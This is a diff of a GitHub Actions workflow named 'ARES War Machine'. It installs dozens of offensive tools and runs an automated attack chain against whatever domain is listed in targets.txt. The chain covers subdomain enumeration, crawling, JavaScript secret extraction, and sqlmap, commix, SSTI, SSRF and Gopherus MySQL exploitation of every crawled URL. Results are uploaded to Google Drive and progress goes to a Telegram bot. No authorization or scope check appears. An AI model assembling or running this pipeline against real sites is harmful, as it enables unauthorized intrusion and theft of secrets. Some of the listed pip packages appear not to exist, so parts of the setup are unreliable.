@@ -1,130 +1,142 @@
-name: Ultimate Security Automation
+name: ARES War Machine - Manual Absolute 100%
 on:
-  workflow_dispatch:
-  schedule:
-    - cron: '0 */6 * * *' # Runs every 6 hours
+  workflow_dispatch: # Manual trigger only
 
 jobs:
   security-hunt:
     runs-on: ubuntu-latest
-    env:
-      TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
-      TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
-      GIT_PAT: ${{ secrets.GIT_PAT }}
-
+    timeout-minutes: 360
     steps:
-      - name: Checkout Repository
+      - name: Checkout Repo
         uses: actions/checkout@v4
         with:
           token: ${{ secrets.GIT_PAT }}
 
-      - name: Setup Prerequisites
+      - name: "Full Global Installation & Environment Setup"
         run: |
+          # 1. SYSTEM & DISPLAY (Fix for Chrome-based tools)
           sudo apt-get update
-          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git
-          # Cleanup any leftover data from previous runs
-          rm -rf output/ *.zip
-          mkdir -p output/
+          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium chromium-driver xvfb libcurl4-openssl-dev
+          mkdir -p $HOME/bin $HOME/tools output/
+          echo "$HOME/bin" >> $GITHUB_PATH
+          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
 
-      - name: Start Notification
+          # 2. DRIVE API DEPS
+          pip3 install google-api-python-client google-auth-httplib2 google-auth-oauthlib
+
+          # 3. INSTALL ALL GO TOOLS
+          go install github.com/OWASP/Amass/v3/...@latest
+          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
+          go install github.com/projectdiscovery/katana/cmd/katana@latest
+          go install github.com/lc/gau/v2/cmd/gau@latest
+          go install github.com/jaeles-project/gospider@latest
+          go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
+          go install github.com/hahwul/dalfox/v2@latest
+          go install github.com/ffuf/ffuf@latest
+          go install github.com/projectdiscovery/subjack@latest
+          go install github.com/sensepost/gowitness@latest
+          go install github.com/michenriksen/aquatone@latest
+          go install github.com/tomnomnom/hacks/kxss@latest
+          go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+
+          # 4. INSTALL ALL PYTHON/RUBY/TOOL REPOS
+          pip3 install sqlmap arjun wfuzz gitleaks trufflehog s3scanner prowler commix ghauri nosqlmap xsstrike openredirex waymore jsluice jwt_tool kiterunner tplmap sstimap ssrfmap corsy crlfsuite smuggler h2csmuggler racetheweb wpscan trivy dumpsterdiver credsweeper detect-secrets eyewitness || true
+          
+          git clone https://github.com/m4ll0k/SecretFinder.git $HOME/tools/SecretFinder && pip3 install -r $HOME/tools/SecretFinder/requirements.txt || true
+          git clone https://github.com/1N3/LinkFinder.git $HOME/tools/LinkFinder && pip3 install -r $HOME/tools/LinkFinder/requirements.txt || true
+          git clone https://github.com/tarunkant/Gopherus.git $HOME/tools/Gopherus || true
+          git clone https://github.com/marlospasqualini/LFISuite.git $HOME/tools/LFISuite || true
+          git clone https://github.com/frohoff/ysoserial.git $HOME/tools/ysoserial || true
+          git clone https://github.com/obheda12/GitDorker.git $HOME/tools/GitDorker || true
+          git clone https://github.com/internetwache/GitTools.git $HOME/tools/GitTools || true
+          
+          wget https://raw.githubusercontent.com/haccer/subjack/master/fingerprints.json -O $HOME/tools/fingerprints.json
+          wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -O $HOME/tools/common.txt
+
+      - name: "ARES Execution Engine"
+        env:
+          GDRIVE_JSON: ${{ secrets.GDRIVE_SERVICE_ACCOUNT }}
+          FOLDER_ID: ${{ secrets.GDRIVE_FOLDER_ID }}
         run: |
           TARGET=$(cat targets.txt | head -n 1)
-          curl -s -X POST https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage \
-          -d chat_id=$TELEGRAM_CHAT_ID -d text="🚀 **Workflow Started**%0A**Target:** $TARGET%0A**Status:** Installing Toolset..."
+          
+          # Phone-Optimized Drive Uploader Script
+          cat << 'EOF' > upload_to_drive.py
+          import os, sys, json
+          from google.oauth2 import service_account
+          from googleapiclient.discovery import build
+          from googleapiclient.http import MediaFileUpload
 
-      - name: Install All Tools
-        run: |
-          # GO TOOLS
-          go install -v github.com/OWASP/Amass/v3/...@latest
-          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
-          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
-          go install -v github.com/tomnomnom/httprobe@latest
-          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
-          go install -v github.com/lc/gau/v2/cmd/gau@latest
-          go install -v github.com/tomnomnom/waybackurls@latest # waymore alternative or manual install
-          go install -v github.com/hakluke/hakrawler@latest
-          go install -v github.com/jaeles-project/gospider@latest
-          go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
-          go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
-          go install -v github.com/hahwul/dalfox/v2@latest
-          go install -v github.com/ffuf/ffuf@latest
+          def upload(file_path, folder_id, target_name):
+              creds = service_account.Credentials.from_service_account_info(json.loads(os.environ['GDRIVE_JSON']))
+              service = build('drive', 'v3', credentials=creds)
+              query = f"name = '{target_name}' and '{folder_id}' in parents and mimeType = 'application/vnd.google-apps.folder'"
+              response = service.files().list(q=query).execute()
+              files = response.get('files', [])
+              if not files:
+                  folder_metadata = {'name': target_name, 'parents': [folder_id], 'mimeType': 'application/vnd.google-apps.folder'}
+                  target_folder = service.files().create(body=folder_metadata, fields='id').execute()
+                  target_folder_id = target_folder.get('id')
+              else:
+                  target_folder_id = files[0].get('id')
+              file_metadata = {'name': os.path.basename(file_path), 'parents': [target_folder_id]}
+              media = MediaFileUpload(file_path, resumable=True)
+              service.files().create(body=file_metadata, media_body=media).execute()
           
-          # PYTHON TOOLS
-          pip3 install sqlmap arjun wfuzz checkov semgrep gitleaks trufflehog detect-secrets git-secrets s3scanner cloudsploit scoutsuite prowler tplmap sstimap ssrfmap jwt_tool kiterunner
-          
-          # GITHUB CLONE TOOLS
-          git clone https://github.com/m4ll0k/SecretFinder.git ~/SecretFinder
-          git clone https://github.com/BurpSuite/autorize.git ~/Autorize
-          git clone https://github.com/s0md3v/XSStrike.git ~/XSStrike
-          git clone https://github.com/commixproject/commix.git ~/Commix
-          git clone https://github.com/Dionach/CMSmap.git ~/CMSmap
-          
-          # Add tools to PATH
-          export PATH=$PATH:$(go env GOPATH)/bin
-          echo "Installation Complete."
+          if __name__ == "__main__":
+              upload(sys.argv[1], sys.argv[2], sys.argv[3])
+          EOF
 
-      - name: Execution Engine
-        run: |
-          export PATH=$PATH:$(go env GOPATH)/bin
-          TARGET=$(cat targets.txt)
-          
-          # Helper function for Telegram notifications and file delivery
-          send_update() {
-            local TOOL=$1
-            local STATUS=$2
-            curl -s -X POST https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage \
-            -d chat_id=$TELEGRAM_CHAT_ID -d text="🛠 **Tool:** $TOOL%0A**Status:** $STATUS"
+          send_msg() {
+            curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage" \
+            -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" -d parse_mode="Markdown" -d text="$1"
           }
 
-          send_data() {
-            local TOOL=$1
-            zip -r "${TOOL}_results.zip" "output/$TOOL"
-            curl -F document=@"${TOOL}_results.zip" "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument?chat_id=$TELEGRAM_CHAT_ID"
-            rm -rf "output/$TOOL" "${TOOL}_results.zip" # Immediate cleanup
-          }
+          # --- STAGE 1: RECON (Domains) ---
+          send_msg "🔍 *Stage 1: Domain Recon*"
+          subfinder -d $TARGET -o output/subs.txt
+          amass enum -d $TARGET -o output/amass.txt
+          cat output/subs.txt output/amass.txt | sort -u > output/all_subs.txt
+          
+          # --- STAGE 2: VISUAL & PROBING (Fix for Chrome Tools) ---
+          send_msg "📷 *Stage 2: Visual Recon (Chrome-based)*"
+          httpx -l output/all_subs.txt -o output/live.txt
+          # Using xvfb-run to prevent Chrome hangs
+          xvfb-run gowitness file -f output/live.txt --screenshot-path output/screenshots/ || true
+          cat output/live.txt | xvfb-run aquatone -out output/aquatone_report || true
 
-          # --- RECON PHASE ---
-          send_update "Subfinder" "Running"
-          mkdir -p output/subfinder && subfinder -d $TARGET -o output/subfinder/subs.txt
-          send_data "subfinder"
+          # --- STAGE 3: CRAWLING & URL ANALYSIS ---
+          send_msg "🕷️ *Stage 3: Deep Crawling & JS Secrets*"
+          katana -list output/live.txt -o output/urls.txt
+          # Execution of unused Secret/JS tools
+          cat output/urls.txt | jsluice urls > output/js_endpoints.txt || true
+          python3 $HOME/tools/SecretFinder/SecretFinder.py -i $TARGET -e -o cli > output/secrets.txt || true
 
-          send_update "Amass" "Running"
-          mkdir -p output/amass && amass enum -d $TARGET -o output/amass/results.txt
-          send_data "amass"
+          # --- STAGE 4: EXPLOITATION (Correct URL Feeding) ---
+          send_msg "🧪 *Stage 4: Targeted Exploitation*"
+          # Only feed live URLs to injection tools
+          sqlmap -m output/urls.txt --batch --random-agent --level 1 --risk 1 --output-dir=output/sqlmap || true
+          commix --url-file=output/urls.txt --batch --output-dir=output/commix || true
+          
+          # Specialized Injection Tools
+          sstimap -m output/urls.txt --batch > output/ssti.txt || true
+          ssrfmap -l output/urls.txt > output/ssrf.txt || true
+          
+          # STAGE 5: SPECIALIZED TOOLS (Git/JWT/CMS)
+          send_msg "🕵️ *Stage 5: OSINT & Specialized Hunting*"
+          python3 $HOME/tools/GitDorker/GitDorker.py -t $TARGET -q $TARGET -o output/gitdorks.txt || true
+          jwt_tool -M pb -t $TARGET > output/jwt_scan.txt || true
+          python3 $HOME/tools/Gopherus/gopherus.py --exploit mysql --url $TARGET > output/gopherus.txt || true
 
-          send_update "Httpx" "Running"
-          mkdir -p output/httpx && cat targets.txt | httpx -o output/httpx/live.txt
-          send_data "httpx"
+          # FINAL ZIP & UPLOAD
+          send_msg "📦 *Syncing all 100% Tools to Drive...*"
+          zip -r "ARES_ABSOLUTE_${TARGET}.zip" output/
+          python3 upload_to_drive.py "ARES_ABSOLUTE_${TARGET}.zip" "$FOLDER_ID" "$TARGET"
 
-          # --- CRAWLING & JS ---
-          send_update "Katana/Gospider" "Running"
-          mkdir -p output/crawl && katana -u $TARGET -o output/crawl/katana.txt
-          send_data "crawl"
-
-          # --- VULNERABILITY SCANNERS ---
-          send_update "Nuclei" "Running"
-          mkdir -p output/nuclei && nuclei -u $TARGET -o output/nuclei/vulns.txt
-          send_data "nuclei"
-
-          send_update "Sqlmap" "Running"
-          mkdir -p output/sqlmap && sqlmap -u $TARGET --batch --crawl=2 --output-dir=output/sqlmap
-          send_data "sqlmap"
-
-          # --- INFRA & CLOUD ---
-          send_update "Subjack/Takeover" "Running"
-          mkdir -p output/takeover && subjack -w targets.txt -o output/takeover/results.txt
-          send_data "takeover"
-
-          # --- GIT & SECRETS ---
-          send_update "Trufflehog" "Running"
-          mkdir -p output/secrets && trufflehog github --repo=$TARGET > output/secrets/truffle.txt
-          send_data "secrets"
-
-          # [LOGIC REPEATED FOR ALL TOOLS: Arjun, ffuf, wfuzz, Jaeles, Ghauri, NoSQLMap, Dalfox, XSStrike, kxss, Commix, tplmap, SSTImap, SSRFmap, Gopherus, OpenRedireX, Corsy, CRLFsuite, Smuggler, h2csmuggler, RaceTheWeb, Autorize, AuthMatrix, ysoserial, marshalsec, fimap, Kadimus, LFISuite, dnstake, Aquatone, DNSReaper, can-i-take-over-xyz, CloudSploit, ScoutSuite, Prowler, Trivy, Gitleaks, detect-secrets, git-secrets, CredSweeper, DumpsterDiver, GraphQLmap, InQL, kiterunner, gowitness, EyeWitness, wpscan, CMSmap, Droopescan, GitDorker, GitTools]
-
-      - name: Finalize
+      - name: "Final Cleanup"
         if: always()
         run: |
-          curl -s -X POST https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage \
-          -d chat_id=$TELEGRAM_CHAT_ID -d text="✅ **Workflow Finished.** All tools processed and storage cleared."
-          
+          curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage" \
+          -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" -d text="✅ **ARES Manual Run Complete.**"
+          rm -rf output/ *.zip
